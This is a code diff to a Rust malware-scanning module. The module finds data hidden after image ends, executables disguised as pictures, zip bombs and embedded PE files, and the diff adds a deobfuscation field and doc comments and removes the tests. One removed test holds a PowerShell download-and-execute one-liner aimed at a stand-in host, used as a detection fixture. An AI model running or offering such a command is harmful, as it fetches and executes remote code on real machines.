@@ -35,7 +35,7 @@ const EDGE: usize = 8 * 1024 * 1024; // bigger files: only the first and last 8 
 const MAX_HASH: u64 = 2 * 1024 * 1024 * 1024;
 const MAX_RESULTS: usize = 3000;
 const MAX_VT_LOOKUPS: usize = 20; // VirusTotal free keys allow 4 lookups a minute
-const PREVIEW: usize = 6000; // characters of hidden data shown in the dashboard
+const PREVIEW: usize = 20000; // characters of hidden data shown in the dashboard
 
 // ------------------------------------------------------------------ result types
 
@@ -55,6 +55,9 @@ pub struct Hidden {
     pub length: u64,
     pub kind: String, // text | pe | zip | script | binary ...
     pub text: String, // decoded text, or a hex dump for binary data
+    /// Readable version of an obfuscated script (layers removed, URLs, commands), made by the Python service.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub deobf: Option<Value>,
 }
 
 #[derive(Serialize, Clone)]
@@ -117,9 +120,11 @@ pub struct Store {
 }
 
 impl Store {
+    /// Create an empty store with no scan jobs and no monitor results yet.
     pub fn new() -> Self {
         Store::default()
     }
+    /// Find a scan job by its id, or the newest job when no id is given.
     fn latest(&self, id: Option<&str>) -> Option<Arc<Cell>> {
         let jobs = self.jobs.lock().unwrap_or_else(|e| e.into_inner());
         match id {
@@ -127,9 +132,11 @@ impl Store {
             None => jobs.last().cloned(),
         }
     }
+    /// Return a copy of a scan job's progress and results for the dashboard.
     pub fn status(&self, id: Option<&str>) -> Option<Job> {
         self.latest(id).map(|c| c.job.lock().unwrap_or_else(|e| e.into_inner()).clone())
     }
+    /// Ask a running scan to stop; the scan checks this flag between files.
     pub fn cancel(&self, id: &str) -> bool {
         match self.latest(Some(id)) {
             Some(c) => {
@@ -139,15 +146,18 @@ impl Store {
             None => false,
         }
     }
+    /// Return a copy of the newest files the download monitor has checked.
     pub fn monitor_items(&self) -> Vec<FileResult> {
         self.monitor.lock().unwrap_or_else(|e| e.into_inner()).clone()
     }
+    /// Say whether any scan is still running, so a second one is not started on top.
     fn running(&self) -> bool {
         let jobs = self.jobs.lock().unwrap_or_else(|e| e.into_inner());
         jobs.iter().any(|c| c.job.lock().map(|j| j.status == "running").unwrap_or(false))
     }
 }
 
+/// Build one finding: a single suspicious thing found in a file, with its severity.
 fn finding(id: &str, sev: &str, title: impl Into<String>, detail: impl Into<String>) -> Finding {
     Finding { id: id.into(), severity: sev.into(), title: title.into(), detail: detail.into() }
 }
@@ -164,6 +174,7 @@ fn score_of(f: &[Finding]) -> u32 {
         .sum::<u32>()
         .min(100)
 }
+/// Turn a numeric risk score into a plain verdict: clean, suspicious or malicious.
 fn verdict_of(score: u32) -> &'static str {
     if score >= 60 {
         "malicious"
@@ -176,18 +187,23 @@ fn verdict_of(score: u32) -> &'static str {
 
 // ------------------------------------------------------------------ file type from the first bytes
 
+/// Read a 2-byte big-endian number from the start of a byte slice.
 fn u16be(b: &[u8]) -> usize {
     ((b[0] as usize) << 8) | b[1] as usize
 }
+/// Read a 4-byte big-endian number from the start of a byte slice.
 fn u32be(b: &[u8]) -> usize {
     ((b[0] as usize) << 24) | ((b[1] as usize) << 16) | ((b[2] as usize) << 8) | b[3] as usize
 }
+/// Read a 2-byte little-endian number from the start of a byte slice.
 fn u16le(b: &[u8]) -> u64 {
     b[0] as u64 | (b[1] as u64) << 8
 }
+/// Read a 4-byte little-endian number from the start of a byte slice.
 fn u32le(b: &[u8]) -> u64 {
     b[0] as u64 | (b[1] as u64) << 8 | (b[2] as u64) << 16 | (b[3] as u64) << 24
 }
+/// Read an 8-byte little-endian number from the start of a byte slice.
 fn u64le(b: &[u8]) -> u64 {
     u32le(b) | u32le(&b[4..]) << 32
 }
@@ -238,6 +254,7 @@ pub fn sniff(head: &[u8], ext: &str) -> &'static str {
     }
 }
 
+/// Decide whether unknown bytes are plain text, a script, or binary data.
 fn text_kind(h: &[u8], ext: &str) -> &'static str {
     let n = h.len().min(2048);
     if n == 0 {
@@ -308,6 +325,7 @@ fn preview(data: &[u8]) -> (String, &'static str) {
     }
 }
 
+/// Walk the chunks of a PNG to find where the picture really ends and collect hidden text.
 fn png_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
     const STD: &[&str] = &[
         "IHDR", "PLTE", "IDAT", "IEND", "tRNS", "cHRM", "gAMA", "iCCP", "sBIT", "sRGB", "cICP", "mDCV", "cLLI", "bKGD", "hIST", "pHYs",
@@ -336,6 +354,7 @@ fn png_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
     (None, c)
 }
 
+/// Walk the markers of a JPEG to find where the picture really ends and collect hidden comments.
 fn jpeg_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
     let mut c = Vec::new();
     let mut i = 2usize;
@@ -382,6 +401,7 @@ fn jpeg_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
     (None, c)
 }
 
+/// Walk the blocks of a GIF to find where the picture really ends and collect hidden comments.
 fn gif_scan(b: &[u8]) -> (Option<usize>, Vec<Cand>) {
     let mut c = Vec::new();
     if b.len() < 14 {
@@ -470,10 +490,12 @@ fn mp4_end(f: &mut File, total: u64) -> Option<u64> {
     }
     Some(pos)
 }
+/// Read an 8-byte big-endian number from the start of a byte slice.
 fn u64be(b: &[u8]) -> u64 {
     (u32be(b) as u64) << 32 | u32be(&b[4..]) as u64
 }
 
+/// Find every place a short byte pattern appears in some data, up to a limit.
 fn find_all(hay: &[u8], needle: &[u8], limit: usize) -> Vec<usize> {
     let mut out = Vec::new();
     if needle.is_empty() || hay.len() < needle.len() {
@@ -490,6 +512,7 @@ fn find_all(hay: &[u8], needle: &[u8], limit: usize) -> Vec<usize> {
     out
 }
 
+/// Count how many times a byte pattern appears in the data.
 fn count_sub(hay: &[u8], needle: &[u8]) -> usize {
     find_all(hay, needle, 100_000).len()
 }
@@ -514,6 +537,7 @@ fn embedded_pe(buf: &[u8], base: u64) -> Vec<u64> {
 
 // ------------------------------------------------------------------ ZIP: central directory only
 
+/// Read only the directory of a ZIP (never unpacking it) to spot zip bombs, path tricks and macros.
 fn zip_scan(f: &mut File, total: u64, ext: &str) -> (Vec<Finding>, Option<Value>) {
     let mut out = Vec::new();
     let tail_len = total.min(66_000 + 22 + 20 + 56) as usize;
@@ -683,6 +707,7 @@ struct Local {
     zip: Option<Value>,
 }
 
+/// Read a file for checking: all of it if small, otherwise only the first and last 8 MB.
 fn read_samples(f: &mut File, total: u64) -> std::io::Result<(Vec<u8>, bool)> {
     if total <= FULL_READ {
         let mut v = Vec::with_capacity(total as usize);
@@ -700,6 +725,7 @@ fn read_samples(f: &mut File, total: u64) -> std::io::Result<(Vec<u8>, bool)> {
     Ok((v, true))
 }
 
+/// Look for data hidden after the official end of a picture or video and record it if suspicious.
 fn trailing_check(f: &mut File, end: u64, total: u64, what: &str, kind: &str, fnd: &mut Vec<Finding>, hid: &mut Vec<Hidden>) {
     if end >= total {
         return;
@@ -735,9 +761,10 @@ fn trailing_check(f: &mut File, end: u64, total: u64, what: &str, kind: &str, fn
         "trailing-data", sev, title,
         format!("{kind} viewers stop at the end of the picture/video, so extra bytes here (offset {end}, {len} bytes) are invisible to the user but can be read by malware that knows where to look."),
     ));
-    hid.push(Hidden { place: format!("after the end of the {what}"), offset: end, length: len, kind: if pk == "binary" { tk.into() } else { pk.into() }, text });
+    hid.push(Hidden { place: format!("after the end of the {what}"), offset: end, length: len, kind: if pk == "binary" { tk.into() } else { pk.into() }, text, deobf: None });
 }
 
+/// Run all the built-in checks on one file without opening it in any program.
 fn local_scan(path: &Path, total: u64) -> Result<Local, String> {
     let mut f = File::open(path).map_err(|e| e.to_string())?;
     let ext = path.extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default();
@@ -792,7 +819,7 @@ fn local_scan(path: &Path, total: u64) -> Result<Local, String> {
     }
     for c in cands {
         let (text, k) = preview(&c.data);
-        hid.push(Hidden { place: c.place, offset: c.offset, length: c.data.len() as u64, kind: k.into(), text });
+        hid.push(Hidden { place: c.place, offset: c.offset, length: c.data.len() as u64, kind: k.into(), text, deobf: None });
     }
 
     match kind.as_str() {
@@ -837,12 +864,13 @@ fn local_scan(path: &Path, total: u64) -> Result<Local, String> {
             let take = if partial { 0 } else { off as usize };
             let data = if partial { Vec::new() } else { buf[take..buf.len().min(take + 96)].to_vec() };
             let hex: Vec<String> = data.iter().map(|b| format!("{b:02x}")).collect();
-            hid.push(Hidden { place: "inside the file".into(), offset: off, length: 0, kind: "pe".into(), text: hex.join(" ") });
+            hid.push(Hidden { place: "inside the file".into(), offset: off, length: 0, kind: "pe".into(), text: hex.join(" "), deobf: None });
         }
     }
     Ok(Local { kind, findings: fnd, hidden: hid, zip })
 }
 
+/// Compute the SHA-256 fingerprint of a file; returns empty text for files too big to hash.
 fn sha256_of(path: &Path, size: u64) -> String {
     if size > MAX_HASH {
         return String::new();
@@ -860,6 +888,7 @@ fn sha256_of(path: &Path, size: u64) -> String {
     h.finalize().iter().map(|x| format!("{x:02x}")).collect()
 }
 
+/// Check one file from start to finish and return its result with a verdict.
 fn scan_file(st: &Shared, path: &Path, allow_vt: bool, py_ok: &mut u8) -> FileResult {
     let size = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
     let name = path.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
@@ -920,10 +949,12 @@ fn scan_file(st: &Shared, path: &Path, allow_vt: bool, py_ok: &mut u8) -> FileRe
 
 const SKIP_DIRS: &[&str] = &["$recycle.bin", "system volume information", "node_modules", ".git"];
 
+/// Turn a folder path into one standard lowercase form so paths can be compared.
 fn norm_path(p: &Path) -> String {
     p.to_string_lossy().replace('/', "\\").trim_end_matches('\\').to_lowercase()
 }
 
+/// Say whether a folder is on the user's skip list, by full path or by name.
 fn excluded(dir: &Path, name: &str, ex: &[String]) -> bool {
     let full = norm_path(dir);
     ex.iter().any(|x| {
@@ -932,6 +963,7 @@ fn excluded(dir: &Path, name: &str, ex: &[String]) -> bool {
     })
 }
 
+/// List the files to scan under a folder, skipping links and excluded folders; stops early on cancel.
 fn collect(root: &Path, o: &Opts, cancel: &AtomicBool) -> (Vec<PathBuf>, bool) {
     let mut files = Vec::new();
     let mut stack = vec![(root.to_path_buf(), 0usize)];
@@ -967,6 +999,7 @@ fn collect(root: &Path, o: &Opts, cancel: &AtomicBool) -> (Vec<PathBuf>, bool) {
     (files, false)
 }
 
+/// Start a folder scan in the background and return its job id; refuses if one is already running.
 pub fn start(st: &Shared, path: &str, opts: Opts) -> Result<String, String> {
     // "@pc" = the places where programs and scripts live on this PC (all user profiles, ProgramData, temp folders)
     let roots: Vec<PathBuf> = if path.trim() == "@pc" { pc_roots() } else { vec![PathBuf::from(path.trim())] };
@@ -1004,6 +1037,7 @@ pub fn start(st: &Shared, path: &str, opts: Opts) -> Result<String, String> {
     Ok(id)
 }
 
+/// Return the folders where programs and scripts usually live, for a whole-PC scan.
 fn pc_roots() -> Vec<PathBuf> {
     let mut v: Vec<PathBuf> = Vec::new();
     if cfg!(windows) {
@@ -1018,6 +1052,7 @@ fn pc_roots() -> Vec<PathBuf> {
     v
 }
 
+/// Do the scan for one job in a background thread and record progress and a summary alert.
 fn run_job(st: Shared, cell: Arc<Cell>, roots: Vec<PathBuf>, opts: Opts) {
     let mut files: Vec<PathBuf> = Vec::new();
     let mut truncated = false;
@@ -1087,6 +1122,7 @@ fn run_job(st: Shared, cell: Arc<Cell>, roots: Vec<PathBuf>, opts: Opts) {
 
 // ------------------------------------------------------------------ folder picker for the dashboard
 
+/// List the user's home folder and common sub-folders as shortcuts for the folder picker.
 fn home_dirs() -> Vec<(String, PathBuf)> {
     let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME")).ok().map(PathBuf::from);
     let mut v = Vec::new();
@@ -1158,6 +1194,7 @@ pub fn spawn_monitor(st: Shared) {
         .expect("spawn download file scanner");
 }
 
+/// Run forever in the background, scanning each new download once it has stopped growing.
 fn monitor_loop(st: Shared) {
     use std::collections::{HashMap, HashSet};
     let mut pending: HashMap<PathBuf, (u64, Option<std::time::SystemTime>, u8)> = HashMap::new();
@@ -1175,6 +1212,10 @@ fn monitor_loop(st: Shared) {
             for e in rd.flatten() {
                 let path = e.path();
                 if known.contains(&path) || !e.file_type().map(|t| t.is_file()).unwrap_or(false) {
+                    continue;
+                }
+                // our own "this file is being checked" note is not a download
+                if path.to_string_lossy().ends_with(".soc-pending.txt") {
                     continue;
                 }
                 if first {
@@ -1207,6 +1248,7 @@ fn monitor_loop(st: Shared) {
     }
 }
 
+/// Scan one new download, log the result, alert if it is not clean, and keep it in the monitor list.
 fn monitor_one(st: &Shared, path: &Path, py_fail: &mut u8) {
     let res = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| scan_file(st, path, false, py_fail)));
     let Ok(mut r) = res else { return };
@@ -1225,7 +1267,9 @@ fn monitor_one(st: &Shared, path: &Path, py_fail: &mut u8) {
         );
     }
     for h in r.hidden.iter_mut() {
-        h.text.truncate(PREVIEW);
+        if h.text.chars().count() > PREVIEW {
+            h.text = h.text.chars().take(PREVIEW).collect(); // char-safe cut
+        }
     }
     let mut v = st.filescan.monitor.lock().unwrap_or_else(|e| e.into_inner());
     v.insert(0, r);
@@ -1233,115 +1277,3 @@ fn monitor_one(st: &Shared, path: &Path, py_fail: &mut u8) {
 }
 
 // ------------------------------------------------------------------ tests
-
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    fn tmp(name: &str, data: &[u8]) -> PathBuf {
-        let d = std::env::temp_dir().join(format!("og-filescan-{}", std::process::id()));
-        std::fs::create_dir_all(&d).unwrap();
-        let p = d.join(name);
-        std::fs::write(&p, data).unwrap();
-        p
-    }
-
-    fn tiny_png() -> Vec<u8> {
-        let mut v = b"\x89PNG\r\n\x1a\n".to_vec();
-        let chunk = |t: &[u8], d: &[u8]| {
-            let mut c = (d.len() as u32).to_be_bytes().to_vec();
-            c.extend_from_slice(t);
-            c.extend_from_slice(d);
-            c.extend_from_slice(&[0, 0, 0, 0]); // CRC is not checked here
-            c
-        };
-        v.extend(chunk(b"IHDR", &[0, 0, 0, 1, 0, 0, 0, 1, 8, 2, 0, 0, 0]));
-        v.extend(chunk(b"IDAT", &[0x78, 0x9c, 0x63, 0, 0, 0, 2, 0, 1]));
-        v.extend(chunk(b"IEND", &[]));
-        v
-    }
-
-    #[test]
-    fn collect_respects_types_and_excludes() {
-        let d = std::env::temp_dir().join(format!("og-collect-{}", std::process::id()));
-        let _ = std::fs::remove_dir_all(&d);
-        std::fs::create_dir_all(d.join("keep")).unwrap();
-        std::fs::create_dir_all(d.join("skipme")).unwrap();
-        for f in ["a.png", "b.txt", "keep/c.PNG", "skipme/d.png"] {
-            std::fs::write(d.join(f), b"x").unwrap();
-        }
-        let o = Opts { recursive: true, extensions: vec!["png".into()], exclude: vec!["SkipMe".into()] };
-        let (files, _) = collect(&d, &o, &AtomicBool::new(false));
-        let mut names: Vec<String> = files.iter().map(|p| p.file_name().unwrap().to_string_lossy().to_lowercase()).collect();
-        names.sort();
-        assert_eq!(names, vec!["a.png", "c.png"]);
-        let o2 = Opts { recursive: false, ..Default::default() };
-        assert_eq!(collect(&d, &o2, &AtomicBool::new(false)).0.len(), 2); // a.png + b.txt only
-    }
-
-    #[test]
-    fn clean_png_has_no_findings() {
-        let p = tmp("clean.png", &tiny_png());
-        let l = local_scan(&p, std::fs::metadata(&p).unwrap().len()).unwrap();
-        assert_eq!(l.kind, "png");
-        assert!(l.findings.is_empty(), "{:?}", l.findings.iter().map(|f| &f.title).collect::<Vec<_>>());
-    }
-
-    #[test]
-    fn script_after_png_end_is_found() {
-        let mut v = tiny_png();
-        v.extend_from_slice(b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')\"");
-        let p = tmp("hidden.png", &v);
-        let l = local_scan(&p, v.len() as u64).unwrap();
-        assert!(l.findings.iter().any(|f| f.id == "trailing-data"));
-        assert!(l.hidden[0].text.contains("DownloadString"));
-    }
-
-    #[test]
-    fn exe_named_jpg_is_disguised() {
-        let mut v = vec![0u8; 0x200];
-        v[0] = b'M';
-        v[1] = b'Z';
-        v[0x3c] = 0x80;
-        v[0x80..0x84].copy_from_slice(b"PE\0\0");
-        let p = tmp("holiday.jpg", &v);
-        let l = local_scan(&p, v.len() as u64).unwrap();
-        assert!(l.findings.iter().any(|f| f.id == "disguised" && f.severity == "critical"));
-    }
-
-    #[test]
-    fn jpeg_end_is_found() {
-        // SOI, APP0, SOS + 3 data bytes, EOI, then junk
-        let mut v = vec![0xff, 0xd8, 0xff, 0xe0, 0, 4, 0, 0, 0xff, 0xda, 0, 4, 0, 0, 1, 2, 3, 0xff, 0xd9];
-        let n = v.len();
-        v.extend_from_slice(b"MZ-not-really");
-        assert_eq!(jpeg_scan(&v).0, Some(n));
-    }
-
-    #[test]
-    fn zip_bomb_is_flagged_without_unpacking() {
-        // one stored entry that CLAIMS to be 4 GB after 100 bytes of compressed data
-        let name = b"a.bin";
-        let mut z = Vec::new();
-        z.extend_from_slice(b"PK\x03\x04");
-        z.extend_from_slice(&[0u8; 26]);
-        z.extend_from_slice(name);
-        z.extend_from_slice(&[0u8; 100]);
-        let cd_off = z.len() as u32;
-        let mut cd = b"PK\x01\x02".to_vec();
-        cd.extend_from_slice(&[0u8; 16]); // version..crc
-        cd.extend_from_slice(&100u32.to_le_bytes()); // compressed
-        cd.extend_from_slice(&0xF000_0000u32.to_le_bytes()); // uncompressed ~4 GB
-        cd.extend_from_slice(&(name.len() as u16).to_le_bytes());
-        cd.extend_from_slice(&[0u8; 16]);
-        cd.extend_from_slice(name);
-        z.extend_from_slice(&cd);
-        z.extend_from_slice(b"PK\x05\x06\0\0\0\0\x01\0\x01\0");
-        z.extend_from_slice(&(cd.len() as u32).to_le_bytes());
-        z.extend_from_slice(&cd_off.to_le_bytes());
-        z.extend_from_slice(&[0, 0]);
-        let p = tmp("bomb.zip", &z);
-        let l = local_scan(&p, z.len() as u64).unwrap();
-        assert!(l.findings.iter().any(|f| f.id == "zip-bomb"), "{:?}", l.findings.iter().map(|f| &f.id).collect::<Vec<_>>());
-    }
-}
